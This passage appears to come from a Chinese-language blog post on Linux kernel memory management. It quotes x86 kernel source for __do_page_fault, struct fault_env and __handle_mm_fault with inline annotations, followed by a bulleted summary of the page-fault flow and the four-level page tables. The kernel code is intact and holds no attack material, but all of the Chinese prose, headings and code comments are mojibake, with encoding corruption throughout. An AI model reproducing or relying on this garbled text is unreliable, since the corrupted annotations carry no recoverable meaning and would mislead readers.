0.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> (unlikely(fault_in_kernel_space(address))) &#123;        <span class="hljs-comment">/*Ê£ÄÊü•Ëß¶ÂèëÈ°µÈù¢ÊïÖÈöúÁöÑÂú∞ÂùÄÊòØÂê¶‰Ωç‰∫éÂÜÖÊ†∏Á©∫Èó¥„ÄÇ‰ΩÜËøôËæπ‰∏çÂ§™ÂèØËÉΩÂèëÁîüÁº∫È°µÔºåÊâÄ‰ª•Áî®unlikelyÂÆè‰ºòÂåñÔºü*/</span><br>		<span class="hljs-keyword">if</span> (!(error_code &amp; (PF_RSVD | PF_USER | PF_PROT))) &#123;<span class="hljs-comment">/*‰∏â‰∏™Ê†áÂøó‰ΩçÔºö‰ΩøÁî®‰∫ÜÈ°µË°®È°π‰øùÁïôÁöÑÊ†áÂøó‰Ωç„ÄÅÁî®Êà∑Á©∫Èó¥È°µÂºÇÂ∏∏„ÄÅÈ°µ‰øùÊä§ÂºÇÂ∏∏Ôºå‰∏â‰∏™Ê†áÂøó‰ΩçÈÉΩÊó†ËØ¥ÊòéÊòØÁî±ÂÜÖÊ†∏Ëß¶ÂèëÁöÑÂÜÖÊ†∏Á©∫Èó¥ÁöÑÁº∫È°µÂºÇÂ∏∏*/</span><br>			<span class="hljs-keyword">if</span> (vmalloc_fault(address) &gt;= <span class="hljs-number">0</span>)<br>				<span class="hljs-keyword">return</span>;<br><br>			<span class="hljs-keyword">if</span> (kmemcheck_fault(regs, address, error_code))<br>				<span class="hljs-keyword">return</span>;<br>		&#125;<br><br>		<span class="hljs-comment">/* Can handle a stale RO-&gt;RW TLB: */</span><br>		<span class="hljs-keyword">if</span> (spurious_fault(error_code, address))<br>			<span class="hljs-keyword">return</span>;<br><br>		<span class="hljs-comment">/* kprobes don&#x27;t want to hook the spurious faults: */</span><br>		<span class="hljs-keyword">if</span> (kprobes_fault(regs))<br>			<span class="hljs-keyword">return</span>;<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * Don&#x27;t take the mm semaphore here. If we fixup a prefetch</span><br><span class="hljs-comment">		 * fault we could otherwise deadlock:</span><br><span class="hljs-comment">		 */</span><br>		bad_area_nosemaphore(regs, error_code, address, <span class="hljs-literal">NULL</span>);<span class="hljs-comment">/*ÂèëÁîü‰∫Ü‰∏Ä‰∏™‰∏çÂèØÊÅ¢Â§çÁöÑÈ°µÈù¢ÊïÖÈöúÔºåÁõ¥Êé•kill*/</span><br><br>		<span class="hljs-keyword">return</span>;<br>	&#125;<br><br>	<span class="hljs-comment">/* kprobes don&#x27;t want to hook the spurious faults: */</span><br>	<span class="hljs-keyword">if</span> (unlikely(kprobes_fault(regs)))<br>		<span class="hljs-keyword">return</span>;<br><br>	<span class="hljs-keyword">if</span> (unlikely(error_code &amp; PF_RSVD))<br>		pgtable_bad(regs, error_code, address);<br><br>	<span class="hljs-keyword">if</span> (unlikely(smap_violation(error_code, regs))) &#123;<span class="hljs-comment">/*smapÔºåÁõ¥Êé•gg*/</span><br>		bad_area_nosemaphore(regs, error_code, address, <span class="hljs-literal">NULL</span>);<br>		<span class="hljs-keyword">return</span>;<br>	&#125;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * If we&#x27;re in an interrupt, have no user context or are running</span><br><span class="hljs-comment">	 * in a region with pagefaults disabled then we must not take the fault</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> (unlikely(faulthandler_disabled() || !mm)) &#123;<br>		bad_area_nosemaphore(regs, error_code, address, <span class="hljs-literal">NULL</span>);<br>		<span class="hljs-keyword">return</span>;<br>	&#125;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * It&#x27;s safe to allow irq&#x27;s after cr2 has been saved and the</span><br><span class="hljs-comment">	 * vmalloc fault has been handled.</span><br><span class="hljs-comment">	 *</span><br><span class="hljs-comment">	 * User-mode registers count as a user access even for any</span><br><span class="hljs-comment">	 * potential system fault or CPU buglet:</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> (user_mode(regs)) &#123; <span class="hljs-comment">/*ÁîüÁº∫È°µÂºÇÂ∏∏Êó∂ÁöÑÂØÑÂ≠òÂô®Áä∂ÊÄÅ‰∏∫Áî®Êà∑ÊÄÅ‰∏ãÁöÑ*/</span><br>		local_irq_enable();<br>		error_code |= PF_USER;<br>		flags |= FAULT_FLAG_USER;<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		<span class="hljs-keyword">if</span> (regs-&gt;flags &amp; X86_EFLAGS_IF)<br>			local_irq_enable();<br>	&#125;<br><br>	perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS, <span class="hljs-number">1</span>, regs, address);<br><br>	<span class="hljs-keyword">if</span> (error_code &amp; PF_WRITE)<br>		flags |= FAULT_FLAG_WRITE;<br>	<span class="hljs-keyword">if</span> (error_code &amp; PF_INSTR)<br>		flags |= FAULT_FLAG_INSTRUCTION;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * When running in the kernel we expect faults to occur only to</span><br><span class="hljs-comment">	 * addresses in user space.  All other faults represent errors in</span><br><span class="hljs-comment">	 * the kernel and should generate an OOPS.  Unfortunately, in the</span><br><span class="hljs-comment">	 * case of an erroneous fault occurring in a code path which already</span><br><span class="hljs-comment">	 * holds mmap_sem we will deadlock attempting to validate the fault</span><br><span class="hljs-comment">	 * against the address space.  Luckily the kernel only validly</span><br><span class="hljs-comment">	 * references user space from well defined areas of code, which are</span><br><span class="hljs-comment">	 * listed in the exceptions table.</span><br><span class="hljs-comment">	 *</span><br><span class="hljs-comment">	 * As the vast majority of faults will be valid we will only perform</span><br><span class="hljs-comment">	 * the source reference check when there is a possibility of a</span><br><span class="hljs-comment">	 * deadlock. Attempt to lock the address space, if we cannot we then</span><br><span class="hljs-comment">	 * validate the source. If this is invalid we can skip the address</span><br><span class="hljs-comment">	 * space check, thus avoiding the deadlock:</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> (unlikely(!down_read_trylock(&amp;mm-&gt;mmap_sem))) &#123;<br>		<span class="hljs-keyword">if</span> ((error_code &amp; PF_USER) == <span class="hljs-number">0</span> &amp;&amp;<br>		    !search_exception_tables(regs-&gt;ip)) &#123;<br>			bad_area_nosemaphore(regs, error_code, address, <span class="hljs-literal">NULL</span>);<br>			<span class="hljs-keyword">return</span>;<br>		&#125;<br>retry:<br>		down_read(&amp;mm-&gt;mmap_sem);<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * The above down_read_trylock() might have succeeded in</span><br><span class="hljs-comment">		 * which case we&#x27;ll have missed the might_sleep() from</span><br><span class="hljs-comment">		 * down_read():</span><br><span class="hljs-comment">		 */</span><br>		might_sleep();<br>	&#125;<br><br>	vma = find_vma(mm, address);<br>	<span class="hljs-keyword">if</span> (unlikely(!vma)) &#123;<br>		bad_area(regs, error_code, address);<br>		<span class="hljs-keyword">return</span>;<br>	&#125;<br>	<span class="hljs-keyword">if</span> (likely(vma-&gt;vm_start &lt;= address))<span class="hljs-comment">/*Ê£ÄÊü•Ëß¶ÂèëÈ°µÈù¢ÊïÖÈöúÁöÑÂú∞ÂùÄÊòØÂê¶Âú®ÂΩìÂâçËøõÁ®ãÁöÑÂÜÖÂ≠òÊò†Â∞ÑÂå∫ÂüüÂÜÖ*/</span><br>		<span class="hljs-keyword">goto</span> good_area;<br>	<span class="hljs-keyword">if</span> (unlikely(!(vma-&gt;vm_flags &amp; VM_GROWSDOWN))) &#123;<br>		bad_area(regs, error_code, address);<br>		<span class="hljs-keyword">return</span>;<br>	&#125;<br>	<span class="hljs-keyword">if</span> (error_code &amp; PF_USER) &#123;<span class="hljs-comment">/*Áº∫È°µÂºÇÂ∏∏Âú∞ÂùÄ‰Ωç‰∫éÁî®Êà∑Á©∫Èó¥*/</span><br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * Accessing the stack below %sp is always a bug.</span><br><span class="hljs-comment">		 * The large cushion allows instructions like enter</span><br><span class="hljs-comment">		 * and pusha to work. (&quot;enter $65535, $31&quot; pushes</span><br><span class="hljs-comment">		 * 32 pointers and then decrements %sp by 65535.)</span><br><span class="hljs-comment">		 */</span><br>		<span class="hljs-keyword">if</span> (unlikely(address + <span class="hljs-number">65536</span> + <span class="hljs-number">32</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) &lt; regs-&gt;sp)) &#123;<br>			bad_area(regs, error_code, address);<br>			<span class="hljs-keyword">return</span>;<br>		&#125;<br>	&#125;<br>	<span class="hljs-keyword">if</span> (unlikely(expand_stack(vma, address))) &#123;<span class="hljs-comment">/*Ë∞ÉÁî® expand_stack() ÂáΩÊï∞Â∞ùËØïÊâ©Â±ïÊ†àÂå∫*/</span><br>		bad_area(regs, error_code, address);<br>		<span class="hljs-keyword">return</span>;<br>	&#125;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * Ok, we have a good vm_area for this memory access, so</span><br><span class="hljs-comment">	 * we can handle it..</span><br><span class="hljs-comment">	 */</span><br><span class="hljs-comment">/*ËøêË°åÂà∞ËøôÈáåÔºåËØ¥ÊòéÊòØÊ≠£Â∏∏ÁöÑÁº∫È°µÂºÇÂ∏∏ÔºåaddrÂ±û‰∫éËøõÁ®ãÁöÑÂú∞ÂùÄÁ©∫Èó¥ÔºåÊ≠§Êó∂ËøõË°åËØ∑Ê±ÇË∞ÉÈ°µÔºåÂàÜÈÖçÁâ©ÁêÜÂÜÖÂ≠ò*/</span><br>good_area:<br>	<span class="hljs-keyword">if</span> (unlikely(access_error(error_code, vma))) &#123;<br>		bad_area_access_error(regs, error_code, address, vma);<br>		<span class="hljs-keyword">return</span>;<br>	&#125;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * If for any reason at all we couldn&#x27;t handle the fault,</span><br><span class="hljs-comment">	 * make sure we exit gracefully rather than endlessly redo</span><br><span class="hljs-comment">	 * the fault.  Since we never set FAULT_FLAG_RETRY_NOWAIT, if</span><br><span class="hljs-comment">	 * we get VM_FAULT_RETRY back, the mmap_sem has been unlocked.</span><br><span class="hljs-comment">	 */</span><br>    <span class="hljs-comment">/*Ê†∏ÂøÉfunction*/</span><br>	fault = handle_mm_fault(vma, address, flags);<br>	major |= fault &amp; VM_FAULT_MAJOR;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * If we need to retry the mmap_sem has already been released,</span><br><span class="hljs-comment">	 * and if there is a fatal signal pending there is no guarantee</span><br><span class="hljs-comment">	 * that we made any progress. Handle this case first.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> (unlikely(fault &amp; VM_FAULT_RETRY)) &#123;<br>		<span class="hljs-comment">/* Retry at most once */</span><br>		<span class="hljs-keyword">if</span> (flags &amp; FAULT_FLAG_ALLOW_RETRY) &#123;<br>			flags &amp;= ~FAULT_FLAG_ALLOW_RETRY;<br>			flags |= FAULT_FLAG_TRIED;<br>			<span class="hljs-keyword">if</span> (!fatal_signal_pending(tsk))<br>				<span class="hljs-keyword">goto</span> retry;<br>		&#125;<br><br>		<span class="hljs-comment">/* User mode? Just return to handle the fatal exception */</span><br>		<span class="hljs-keyword">if</span> (flags &amp; FAULT_FLAG_USER)<span class="hljs-comment">/*Áî®Êà∑ÊÄÅËß¶ÂèëÁî®Êà∑Âú∞ÂùÄÁ©∫Èó¥Áº∫È°µÂºÇÂ∏∏Ôºå‰∫§Áî±‰∏äÂ±ÇÂáΩÊï∞Â§ÑÁêÜ‰∫Ü*/</span><br>			<span class="hljs-keyword">return</span>;<br><br>		<span class="hljs-comment">/* Not returning to user mode? Handle exceptions or die: */</span><br>		no_context(regs, error_code, address, SIGBUS, BUS_ADRERR);<br>		<span class="hljs-keyword">return</span>;<br>	&#125;<br><br>	up_read(&amp;mm-&gt;mmap_sem);<span class="hljs-comment">/*ÈáäÊîæÂÜÖÂ≠òÁÆ°ÁêÜÁªìÊûÑÁöÑËØªÈîÅ*/</span><br>	<span class="hljs-keyword">if</span> (unlikely(fault &amp; VM_FAULT_ERROR)) &#123;<br>		mm_fault_error(regs, error_code, address, vma, fault);<br>		<span class="hljs-keyword">return</span>;<br>	&#125;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * Major/minor page fault accounting. If any of the events</span><br><span class="hljs-comment">	 * returned VM_FAULT_MAJOR, we account it as a major fault.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> (major) &#123;<span class="hljs-comment">/*Â¶ÇÊûúÈ°µÈù¢ÊïÖÈöúË¢´Ê†áËÆ∞‰∏∫ MajorÔºåÂàôÂ¢ûÂä†‰ªªÂä°ÁöÑ maj_flt ËÆ°Êï∞Âô®ÔºõÂê¶ÂàôÔºåÂ¢ûÂä† min_flt ËÆ°Êï∞Âô®*/</span><br>		tsk-&gt;maj_flt++;<br>		perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MAJ, <span class="hljs-number">1</span>, regs, address);<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		tsk-&gt;min_flt++;<br>		perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MIN, <span class="hljs-number">1</span>, regs, address);<span class="hljs-comment">/*ËÆ∞ÂΩïÈ°µÈù¢ÊïÖÈöú‰∫ã‰ª∂ÔºåÁî®‰∫éÊÄßËÉΩÁªüËÆ°*/</span><br>	&#125;<br><br>	check_v8086_mode(regs, address, tsk);<br>&#125;<br>NOKPROBE_SYMBOL(__do_page_fault);<br></code></pre></td></tr></table></figure>

<p>A3üë¥ÊÄªÁªìÁöÑÊµÅÁ®ãÂ¶Ç‰∏ãÔºö</p>
<ul>
<li>Âà§Êñ≠Áº∫È°µÂºÇÂ∏∏Âú∞ÂùÄ‰Ωç‰∫éÁî®Êà∑Âú∞ÂùÄÁ©∫Èó¥ËøòÊòØÂÜÖÊ†∏Âú∞ÂùÄÁ©∫Èó¥</li>
<li>‰Ωç‰∫éÂÜÖÊ†∏Âú∞ÂùÄÁ©∫Èó¥<ul>
<li>ÂÜÖÊ†∏ÊÄÅËß¶ÂèëÁº∫È°µÂºÇÂ∏∏Ôºå<code>vmalloc_fault()</code> Â§ÑÁêÜ</li>
<li>Áî®Êà∑ÊÄÅËß¶ÂèëÁº∫È°µÂºÇÂ∏∏ÔºåÊÆµÈîôËØØÔºåÂèëÈÄÅ<code>SIGSEGV</code>‰ø°Âè∑</li>
</ul>
</li>
<li>‰Ωç‰∫éÁî®Êà∑Âú∞ÂùÄÁ©∫Èó¥<ul>
<li>ÂÜÖÊ†∏ÊÄÅËß¶ÂèëÁº∫È°µÂºÇÂ∏∏<ul>
<li><code>SMAP</code>‰øùÊä§Â∑≤ÂºÄÂêØÔºåÁªàÊ≠¢ËøõÁ®ã</li>
<li>ËøõÁ®ãÊó†Âú∞ÂùÄÁ©∫Èó¥ | ËÆæÁΩÆ‰∫Ü‰∏çÂ§ÑÁêÜÁº∫È°µÂºÇÂ∏∏ÔºåÁªàÊ≠¢ËøõÁ®ã</li>
<li>ËøõÂÖ•‰∏ã‰∏ÄÊ≠•ÊµÅÁ®ã</li>
</ul>
</li>
<li>Áî®Êà∑ÊÄÅËß¶ÂèëÁº∫È°µÂºÇÂ∏∏<ul>
<li>ËÆæÁΩÆÂØπÂ∫îÊ†áÂøó‰ΩçÔºåËøõÂÖ•‰∏ã‰∏ÄÊ≠•ÊµÅÁ®ã</li>
</ul>
</li>
<li>Ê£ÄÊü•ÊòØÂê¶ÊòØÂÜôÈ°µÂºÇÂ∏∏ÔºåÂèØËÉΩÊòØÈ°µ‰∏çÂ≠òÂú®&#x2F;Êó†ÊùÉÈôêÂÜôÔºåËÆæÁΩÆÂØπÂ∫îÊ†áÂøó‰Ωç</li>
<li>ÊâæÂØªÁ∫øÊÄßÂú∞ÂùÄÊâÄÂ±ûÁöÑÁ∫øÊÄßÂå∫Ôºà<strong>vma</strong>Ôºâ[1]<ul>
<li>‰∏çÂ≠òÂú®ÂØπÂ∫î<code>vma</code>ÔºåÈùûÊ≥ïËÆøÈóÆ</li>
<li>Â≠òÂú®ÂØπÂ∫î<code>vma</code>Ôºå‰∏î‰Ωç‰∫é<code>vma</code>ÊâÄÊèèËø∞Âå∫Âüü‰∏≠ÔºåËøõÂÖ•‰∏ã‰∏ÄÊ≠•ÊµÅÁ®ã</li>
<li>Â≠òÂú®ÂØπÂ∫î<code>vma</code>Ôºå‰∏ç‰Ωç‰∫é<code>vma</code>ÊâÄÊèèËø∞Âå∫Âüü‰∏≠ÔºåËØ¥ÊòéÂèØËÉΩÊòØ‰Ωç‰∫éÂ†ÜÊ†àÔºà<strong>stack</strong>ÔºâÔºåÂ∞ùËØïÂ¢ûÈïøÂ†ÜÊ†à</li>
</ul>
</li>
<li>‚ú≥Ë∞ÉÁî®<code>handle_mm_fault()</code>ÂáΩÊï∞Â§ÑÁêÜÔºåËøô‰πüÊòØÂ§ÑÁêÜÁº∫È°µÂºÇÂ∏∏ÁöÑÊ†∏ÂøÉÂáΩÊï∞<ul>
<li>Â§±Ë¥•‰∫ÜÔºåËøõË°åÈáçËØïÔºàËøîÂõûÂà∞[1]ÔºåÂè™‰ºöÈáçËØï‰∏ÄÊ¨°Ôºâ</li>
<li>ÂÖ∂‰ªñÊî∂Â∞æÂ§ÑÁêÜ</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="handle-mm-fault"><a href="#handle-mm-fault" class="headerlink" title="__handle_mm_fault"></a>__handle_mm_fault</h4><p><del>ÊÄª8‰ºöÊúâ‰∫∫Ëøû4Á∫ßÈ°µË°®Ëøò‰∏çÁü•ÈÅìÂêß</del></p>
<p>Âú®<code>Linux</code>‰∏≠ÔºåËôöÊãüÂÜÖÂ≠òÁÆ°ÁêÜÈááÁî®‰∫ÜÂ§öÁ∫ßÈ°µË°®ÁöÑÊñπÂºèÊù•ÂÆûÁé∞„ÄÇÂú®x86Êû∂ÊûÑ‰∏ãÔºå<code>Linux</code>‰ΩøÁî®‰∫Ü4Á∫ßÈ°µË°®Ôºà<strong>4-level paging</strong>ÔºâÔºå‰πüÁß∞‰∏∫Â§öÁ∫ßÈ°µË°®Ôºà<strong>multilevel paging</strong>ÔºâÊàñËÄÖÂàÜÂ±ÇÈ°µË°®Ôºà<strong>hierarchical paging</strong>Ôºâ„ÄÇ</p>
<p>4Á∫ßÈ°µË°®ÊòØÊåáÁî±Âõõ‰∏™Á∫ßÂà´ÁöÑÈ°µË°®ÁªÑÊàêÁöÑÂ±ÇÊ¨°ÁªìÊûÑÔºåÊØè‰∏™Á∫ßÂà´ÁöÑÈ°µË°®Ë¥üË¥£Â∞ÜËôöÊãüÂú∞ÂùÄÊò†Â∞ÑÂà∞Áâ©ÁêÜÂú∞ÂùÄÁöÑ‰∏çÂêåÈÉ®ÂàÜ„ÄÇËøô‰∫õÁ∫ßÂà´‰æùÊ¨°‰∏∫Ôºö</p>
<ol>
<li><strong>È°µÂÖ®Â±ÄÁõÆÂΩïË°®ÔºàPage Global DirectoryÔºåPGDÔºâ</strong>ÔºöÁ¨¨‰∏ÄÁ∫ßÈ°µË°®ÔºåÁî®‰∫éÂ∞ÜËôöÊãüÂú∞ÂùÄËΩ¨Êç¢‰∏∫È°µ‰∏äÁ∫ßÁõÆÂΩïË°®Ôºà<strong>Page Upper DirectoryÔºåPUD</strong>ÔºâÁöÑÁ¥¢Âºï„ÄÇ</li>
<li><strong>È°µ‰∏äÁ∫ßÁõÆÂΩïË°®ÔºàPage Upper DirectoryÔºåPUDÔºâ</strong>ÔºöÁ¨¨‰∫åÁ∫ßÈ°µË°®ÔºåÁî®‰∫éÂ∞ÜËôöÊãüÂú∞ÂùÄËΩ¨Êç¢‰∏∫È°µ‰∏≠Èó¥ÁõÆÂΩïË°®Ôºà<strong>Page Middle DirectoryÔºåPMD</strong>ÔºâÁöÑÁ¥¢Âºï„ÄÇ</li>
<li><strong>È°µ‰∏≠Èó¥ÁõÆÂΩïË°®ÔºàPage Middle DirectoryÔºåPMDÔºâ</strong>ÔºöÁ¨¨‰∏âÁ∫ßÈ°µË°®ÔºåÁî®‰∫éÂ∞ÜËôöÊãüÂú∞ÂùÄËΩ¨Êç¢‰∏∫È°µË°®Ôºà<strong>Page TableÔºåPT</strong>ÔºâÁöÑÁ¥¢Âºï„ÄÇ</li>
<li><strong>È°µË°®ÔºàPage TableÔºåPTEÔºâ</strong>ÔºöÁ¨¨ÂõõÁ∫ßÈ°µË°®ÔºåÁî®‰∫éÂ∞ÜËôöÊãüÂú∞ÂùÄËΩ¨Êç¢‰∏∫Áâ©ÁêÜÂú∞ÂùÄ„ÄÇ</li>
</ol>
<p>ÂÜçË¶ÅËÆ§ËØÜ‰∏Ä‰∏™ÁªìÊûÑ‰Ωì</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fault_env</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span>;</span>	<span class="hljs-comment">/* Target VMA */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address;		<span class="hljs-comment">/* Faulting virtual address */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;		<span class="hljs-comment">/* FAULT_FLAG_xxx flags */</span><br>	<span class="hljs-type">pmd_t</span> *pmd;			<span class="hljs-comment">/* Pointer to pmd entry matching</span><br><span class="hljs-comment">					 * the &#x27;address&#x27;</span><br><span class="hljs-comment">					 */</span><br>	<span class="hljs-type">pte_t</span> *pte;			<span class="hljs-comment">/* Pointer to pte entry matching</span><br><span class="hljs-comment">					 * the &#x27;address&#x27;. NULL if the page</span><br><span class="hljs-comment">					 * table hasn&#x27;t been allocated.</span><br><span class="hljs-comment">					 */</span><br>	<span class="hljs-type">spinlock_t</span> *ptl;		<span class="hljs-comment">/* Page table lock.</span><br><span class="hljs-comment">					 * Protects pte page table if &#x27;pte&#x27;</span><br><span class="hljs-comment">					 * is not NULL, otherwise pmd.</span><br><span class="hljs-comment">					 */</span><br>	<span class="hljs-type">pgtable_t</span> prealloc_pte;		<span class="hljs-comment">/* Pre-allocated pte page table.</span><br><span class="hljs-comment">					 * vm_ops-&gt;map_pages() calls</span><br><span class="hljs-comment">					 * alloc_set_pte() from atomic context.</span><br><span class="hljs-comment">					 * do_fault_around() pre-allocates</span><br><span class="hljs-comment">					 * page table to avoid allocation from</span><br><span class="hljs-comment">					 * atomic context.</span><br><span class="hljs-comment">					 */</span><br>&#125;;<br><br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __handle_mm_fault(<span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address,<br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)<br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fault_env</span> <span class="hljs-title">fe</span> =</span> &#123;<span class="hljs-comment">//ÂàõÂª∫‰∏Ä‰∏™ fault_env ÁªìÊûÑ‰Ωì feÔºåÂÖ∂‰∏≠ÂåÖÂê´‰∫Ü vma„ÄÅaddress Âíå flags Á≠â‰ø°ÊÅØ</span><br>		.vma = vma,<br>		.address = address,<br>		.flags = flags,<br>	&#125;;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<br>	<span class="hljs-type">pgd_t</span> *pgd;<span class="hljs-comment">//È°µÂÖ®Â±ÄÁõÆÂΩïÈ°π</span><br>	<span class="hljs-type">pud_t</span> *pud;<span class="hljs-comment">//È°µ‰∏äÁ∫ßÁõÆÂΩïÈ°π</span><br><br>	pgd = pgd_offset(mm, address);<span class="hljs-comment">//Ëé∑ÂèñÂÖ®Â±ÄÈ°µË°®È°π</span><br>	pud = pud_alloc(mm, pgd, address);<span class="hljs-comment">//Ëé∑ÂèñÈ°µ‰∏äÁ∫ßÁõÆÂΩïÈ°π</span><br>	<span class="hljs-keyword">if</span> (!pud)<span class="hljs-comment">//Ëé∑ÂèñÈ°µ‰∏äÁ∫ßÁõÆÂΩïÈ°πÂ§±Ë¥•Ôºågg</span><br>		<span class="hljs-keyword">return</span> VM_FAULT_OOM;<br>	fe.pmd = pmd_alloc(mm, pud, address);<span class="hljs-comment">//Ëé∑ÂèñÈ°µ‰∏≠Á∫ßÁõÆÂΩïÈ°π</span><br>	<span class="hljs-keyword">if</span> (!fe.pmd)<span class="hljs-comment">//Ëé∑ÂèñÈ°µ‰∏≠Á∫ßÁõÆÂΩïÈ°πÂ§±Ë¥•Ôºågg</span><br>		<span class="hljs-keyword">return</span> VM_FAULT_OOM;<br>	<span class="hljs-keyword">if</span> (pmd_none(*fe.pmd) &amp;&amp; transparent_hugepage_enabled(vma)) &#123;<span class="hljs-comment">/*È°µÈù¢ÁöÑÈ°µË°®È°π‰∏∫Á©∫‰∏îÈÄèÊòéÂ§ßÈ°µÂ∑≤ÂêØÁî®ÔºåÈÇ£‰πàÂÆÉ‰ºöË∞ÉÁî® create_huge_pmd ÂáΩÊï∞Â∞ùËØïÂàõÂª∫‰∏Ä‰∏™Â§ßÈ°µ„ÄÇËøô‰∏™ÂáΩÊï∞ÁöÑÁõÆÁöÑÊòØÂ∞ùËØïÂ∞ÜÂ§ö‰∏™Áâ©ÁêÜÈ°µÊò†Â∞ÑÂà∞‰∏Ä‰∏™Â§ßÈ°µ‰∏äÔºå‰ªéËÄåÊèêÈ´òÂÜÖÂ≠òËÆøÈóÆÊïàÁéá„ÄÇ8ÊáÇÔºåchatÁöÑ*/</span><br>		<span class="hljs-type">int</span> ret = create_huge_pmd(&amp;fe);<br>		<span class="hljs-keyword">if</span> (!(ret &amp; VM_FAULT_FALLBACK))<span class="hljs-comment">/*gg*/</span><br>			<span class="hljs-keyword">return</span> ret;<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		<span class="hljs-type">pmd_t</span> orig_pmd = *fe.pmd;<br>		<span class="hljs-type">int</span> ret;<br><br>		barrier();<br>		<span class="hljs-keyword">if</span> (pmd_trans_huge(orig_pmd) || pmd_devmap(orig_pmd)) &#123;<br>			<span class="hljs-keyword">if</span> (pmd_protnone(orig_pmd) &amp;&amp; vma_is_accessible(vma))<br>				<span class="hljs-keyword">return</span> do_huge_pmd_numa_page(&amp;fe, orig_pmd);<br><br>			<span class="hljs-keyword">if</span> ((fe.flags &amp; FAULT_FLAG_WRITE) &amp;&amp;<br>					!pmd_write(orig_pmd)) &#123;<br>				ret = wp_huge_pmd(&amp;fe, orig_pmd);<br>				<span class="hljs-keyword">if</span> (!(ret &amp; VM_FAULT_FALLBACK))<br>					<span class="hljs-keyword">return</span> ret;<br>			&#125; <span class="hljs-keyword">else</span> &#123;<br>				huge_pmd_set_accessed(&amp;fe, orig_pmd);<br>				<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>			&#125;<br>		&#125;<br>	&#125;<br><br>	<span class="hljs-keyword">return</span> handle_pte_fault(&amp;fe);<span class="hljs-comment">//ËøõÂÖ•Ê†∏ÂøÉÂ§ÑÁêÜÂáΩÊï∞</span><br>&#125;<br></code></pre></td></tr></table></figure>

